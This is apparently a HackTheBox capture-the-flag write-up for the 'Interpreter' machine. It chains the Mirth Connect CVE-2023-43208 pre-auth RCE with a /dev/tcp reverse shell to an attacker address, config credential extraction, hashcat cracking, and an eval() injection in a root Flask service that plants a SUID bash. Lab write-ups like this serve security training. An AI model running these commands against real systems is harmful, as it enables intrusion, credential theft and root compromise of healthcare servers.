---
title: "HTB - Interpreter"
date: 2026-03-29
tags: ["HackTheBox","Linux","Medium","CVE-2023-43208","MirthConnect","RCE","SSTI","Deserialization"]
categories: ["Machines&Challenges"]
difficulty: "Medium"
os: "Linux"
author: "z3r0s"
featuredImage: "/logos/Interpreter.png"
---
| Field | Value |
|-------|-------|
| Difficulty | Medium |
| OS | Linux (Debian 12) |
| CVEs | CVE-2023-43208 · CVE-2023-37679 |

---

## Summary

Interpreter is a Medium-difficulty Linux machine centred around **Mirth Connect 4.4.0**, a widely-deployed open-source healthcare integration engine. The attack chain exploits **CVE-2023-43208** - an unauthenticated pre-auth RCE via XStream deserialization - to gain an initial shell as the service user. Database credentials extracted from Mirth's config file lead to a PBKDF2-hashed password in the internal MySQL/PostgreSQL database. After cracking the hash offline with hashcat, SSH access is gained as user `sedric`. A locally-bound Python Flask service (`notif.py`) running as root exposes an `eval()` sink vulnerable to SSTI, which is abused to plant a SUID bash binary and achieve full root compromise.

---

## Attack Chain Overview

| # | Stage | Technique | CVE/Tool |
|---|-------|-----------|----------|
| 1 | Recon | nmap - Mirth Connect 4.4.0 on ports 80/443/6661 | - |
| 2 | Fingerprint | WhatWeb + Nikto + API version fingerprint | - |
| 3 | Foothold | CVE-2023-43208 pre-auth XStream RCE | CVE-2023-43208 |
| 4 | DB Enum | Extract DB creds from config → dump PBKDF2 hash | - |
| 5 | User | hashcat crack → SSH as `sedric` → `user.txt` | hashcat |
| 6 | Priv-Esc | Flask `notif.py` `eval()` SSTI sink → SUID bash | Internal port 54321 |
| 7 | Root | `bash -p` → root shell | - |

---

## 01 - Recon & Enumeration

```bash
nmap -sC -sV -T4 -F <IP_MACHINE>
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian
80/tcp   open  http    Jetty (Mirth Connect Administrator)
443/tcp  open  ssl     Jetty (Mirth Connect Administrator) [self-signed, 50yr cert]
6661/tcp open  unknown (Mirth Connect internal communications)
```

```bash
# API version fingerprint
curl -sk -H 'X-Requested-With: XMLHttpRequest' \
  https://<IP_MACHINE>/api/server/version
# Returns: 4.4.0
# Mirth Connect 4.4.0 == vulnerable to CVE-2023-43208
```

---

## 02 - Foothold: CVE-2023-43208 (Mirth Connect RCE)

**Vulnerability:** CVE-2023-43208 is a pre-authenticated RCE in NextGen Healthcare Mirth Connect < 4.4.1. It is a patch bypass of CVE-2023-37679. The root cause is **XStream deserialization** in the `XmlMessageBodyReader` class - certain API servlets disable authentication checks, allowing an attacker to trigger arbitrary Java object instantiation and OS command execution via a crafted `application/xml` payload.

### Step 1 - Download PoC

```bash
git clone https://github.com/Thavarshan/CVE-2023-43208
pip install -r requirements.txt --break-system-packages
```

### Step 2 - Start listener + fire exploit

```bash
# Terminal 1
nc -lvnp 4444

# Terminal 2
python3 poc.py \
  -t https://<IP_MACHINE> \
  -c "bash -i >& /dev/tcp/<IP_KALI>/4444 0>&1"
```

```
mirth-connect@interpreter:~$ id
uid=999(mirth-connect) gid=999(mirth-connect)
```

---

## 03 - Credential Extraction: Mirth Config → DB Hash

### Find Mirth database config

```bash
find / -name 'mirth.properties' 2>/dev/null
# /opt/connect/conf/mirth.properties

grep -i 'database\|password\|user' /opt/connect/conf/mirth.properties
# database.url = jdbc:mysql://127.0.0.1:3306/mirthdb
# database.username = mirth
# database.password = <DB_PASSWORD>
```

### Dump hashed credentials

```bash
mysql -u mirth -p<DB_PASSWORD> mirthdb -e 'SELECT * FROM PERSON;'
# Returns PBKDF2-SHA256 hash for user sedric
# Hash format: $pbkdf2-sha256$...$<hash>
```

### Crack with hashcat (mode 10900)

```bash
hashcat -m 10900 sedric_hash.txt /usr/share/wordlists/rockyou.txt

ssh sedric@<IP_MACHINE>
sedric@interpreter:~$ cat user.txt
```

---

## 04 - Privilege Escalation: Flask eval() SSTI → SUID bash

### Discover internal service

```bash
sedric@interpreter:~$ ss -tlnp
# LISTEN 127.0.0.1:54321  ← internal Flask service running as root

ps aux | grep notif
# root <pid> python3 /opt/notif.py
```

### Analyse the vulnerable Flask service

```python
# /opt/notif.py
from flask import Flask, request
app = Flask(__name__)

@app.route('/addPatient', methods=['POST'])
def add_patient():
    data = request.get_json()
    name = data.get('name', '')
    result = eval(name)   # ← VULNERABLE: eval() on user-controlled input
    return str(result)
```

### Exploit eval() to plant SUID bash

```bash
# Step 1 - Inject via eval()
sedric@interpreter:~$ curl -s -X POST http://127.0.0.1:54321/addPatient \
  -H 'Content-Type: application/json' \
  -d '{"name": "__import__(\"os\").system(\"chmod +s /bin/bash\")"}'

# Step 2 - Verify SUID bit
ls -la /bin/bash
# -rwsr-sr-x 1 root root ... /bin/bash

# Step 3 - Get root shell
bash -p
```

```
bash-5.2# id
uid=1001(sedric) gid=1001(sedric) euid=0(root) egid=0(root)
bash-5.2# cat /root/root.txt
```

---

## CVEs Referenced

| CVE ID | Component | Type | Description |
|--------|-----------|------|-------------|
| CVE-2023-43208 | Mirth Connect < 4.4.1 | RCE | Pre-auth XStream deserialization bypass |
| CVE-2023-37679 | Mirth Connect | RCE | Original XStream deserialization (partially patched) |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scan and service enumeration |
| whatweb / nikto | Web technology fingerprinting |
| curl | API version fingerprint and payload delivery |
| CVE-2023-43208 PoC | Pre-auth XStream RCE against Mirth Connect 4.4.0 |
| mysql / psql | Internal database enumeration |
| hashcat -m 10900 | PBKDF2-SHA256 offline hash cracking |
| netcat | Reverse shell listener |
